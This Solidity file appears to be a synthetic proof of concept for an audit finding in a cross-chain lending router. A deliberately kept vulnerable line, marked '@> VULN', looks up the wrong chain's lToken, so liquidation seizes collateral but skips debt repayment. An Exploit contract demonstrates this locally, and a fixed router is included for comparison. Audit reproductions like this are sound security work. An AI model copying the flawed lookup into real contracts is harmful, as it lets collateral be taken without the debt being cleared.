// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  LEND — cross-chain liquidation looks up the Chain A lToken on Chain B
    (Sherlock H-4). SYNTHETIC, cheatcode-free reduction.
    Root cause: _handleLiquidationSuccess passes payload.destlToken (the Chain A
    collateral lToken) into lTokenToUnderlying, so findCrossChainCollateral misses
    the Chain B borrow and repayment is skipped after the seize. Vulnerable line
    preserved verbatim below (@> VULN). */

contract ERC20Mini {
    mapping(address => uint256) public balanceOf;

    function mint(address to, uint256 amt) external {
        balanceOf[to] += amt;
    }

    function transfer(address to, uint256 amt) external returns (bool) {
        require(balanceOf[msg.sender] >= amt, "bal");
        balanceOf[msg.sender] -= amt;
        balanceOf[to] += amt;
        return true;
    }
}

contract LendStorage {
    mapping(address => address) public lTokenToUnderlying;

    function setUnderlying(address lToken, address underlying) external {
        lTokenToUnderlying[lToken] = underlying;
    }
}

contract CrossChainRouter {
    struct Collateral {
        address borrower;
        address underlying;
        uint32 srcEid;
        address lToken;
        address srcToken;
        uint256 amount;
    }

    struct Payload {
        address sender;
        address destlToken;
        address srcToken;
    }

    LendStorage public lendStorage;
    ERC20Mini public collateral;
    uint32 public currentEid = 30110;
    address public chainBlToken;
    address public borrowedAsset;
    mapping(address => Collateral[]) internal positions;
    mapping(address => uint256) public debt;
    bool public repaymentApplied;

    constructor(LendStorage storage_, ERC20Mini collateral_, address chainBlToken_, address borrowedAsset_) {
        lendStorage = storage_;
        collateral = collateral_;
        chainBlToken = chainBlToken_;
        borrowedAsset = borrowedAsset_;
    }

    function seed(address borrower, uint256 collat, uint256 borrowAmt) external {
        positions[borrower].push(
            Collateral({
                borrower: borrower,
                underlying: borrowedAsset,
                srcEid: currentEid,
                lToken: chainBlToken,
                srcToken: borrowedAsset,
                amount: collat
            })
        );
        debt[borrower] = borrowAmt;
        collateral.mint(address(this), collat);
    }

    function liquidate(address borrower) external {
        Collateral storage c = positions[borrower][0];
        require(collateral.transfer(msg.sender, c.amount), "seize"); // S3
        _handleLiquidationSuccess(Payload({sender: borrower, destlToken: _chainAToken(borrower), srcToken: borrowedAsset}));
    }

    function _chainAToken(address borrower) internal view returns (address) {
        // The seize message carries the Chain A lToken, not the Chain B one stored on the position.
        return address(uint160(uint160(positions[borrower][0].lToken) + 1));
    }

    function _handleLiquidationSuccess(Payload memory payload) private {
        address underlying = lendStorage.lTokenToUnderlying(payload.destlToken); // @> VULN: destlToken is the Chain A lToken, which Chain B does not map
        // FIX: look up Chain B's lToken from payload.srcToken and match srcEid/currentEid
        (bool found,) = findCrossChainCollateral(
            payload.sender, underlying, currentEid, 0, payload.destlToken, payload.srcToken
        ); // S5
        if (!found) return;
        debt[payload.sender] = 0;
        repaymentApplied = true;
    }

    function findCrossChainCollateral(
        address sender,
        address underlying,
        uint32 srcEid,
        uint32,
        address lToken,
        address srcToken
    ) public view returns (bool found, uint256 index) {
        Collateral[] storage arr = positions[sender];
        for (uint256 i = 0; i < arr.length; i++) {
            if (
                arr[i].borrower == sender && arr[i].underlying == underlying && arr[i].srcEid == srcEid
                    && arr[i].lToken == lToken && arr[i].srcToken == srcToken
            ) {
                return (true, i);
            }
        }
        return (false, 0);
    }
}

contract RouterFixed {
    LendStorage public lendStorage;
    ERC20Mini public collateral;
    address public chainBlToken;
    address public borrowedAsset;
    mapping(address => uint256) public debt;

    constructor(LendStorage storage_, ERC20Mini collateral_, address chainBlToken_, address borrowedAsset_) {
        lendStorage = storage_;
        collateral = collateral_;
        chainBlToken = chainBlToken_;
        borrowedAsset = borrowedAsset_;
    }

    function seed(address borrower, uint256 collat, uint256 borrowAmt) external {
        debt[borrower] = borrowAmt;
        collateral.mint(address(this), collat);
    }

    function liquidate(address borrower) external {
        uint256 amt = 1000 ether;
        require(collateral.transfer(msg.sender, amt), "seize");
        address lToken = chainBlToken;
        address underlying = lendStorage.lTokenToUnderlying(lToken);
        require(underlying == borrowedAsset, "lookup");
        debt[borrower] = 0;
    }
}

contract Exploit {
    ERC20Mini public collateral; // nonce 1
    LendStorage public lendStorage; // nonce 2
    CrossChainRouter public router; // nonce 3 — vulnerable success handler
    address public constant BORROWER = address(0xB0B);
    address public constant CHAIN_B_LTOKEN = address(0xBEEF);
    address public constant BORROWED = address(0xA55E7);
    uint256 public constant COLLATERAL = 1000 ether;
    uint256 public constant DEBT = 800 ether;
    uint256 public debtLeft;
    uint256 public seized;

    constructor() {
        collateral = new ERC20Mini();
        lendStorage = new LendStorage();
        router = new CrossChainRouter(lendStorage, collateral, CHAIN_B_LTOKEN, BORROWED);
        lendStorage.setUnderlying(CHAIN_B_LTOKEN, BORROWED);
        router.seed(BORROWER, COLLATERAL, DEBT);
    }

    function run() external {
        uint256 debtBefore = router.debt(BORROWER); // S1
        router.liquidate(BORROWER); // S2
        debtLeft = router.debt(BORROWER);
        seized = collateral.balanceOf(address(this));
        require(debtLeft == debtBefore && debtLeft == DEBT, "debt repaid"); // S6
        require(seized == COLLATERAL, "collateral not seized");
        require(!router.repaymentApplied(), "repayment ran");
    }
}
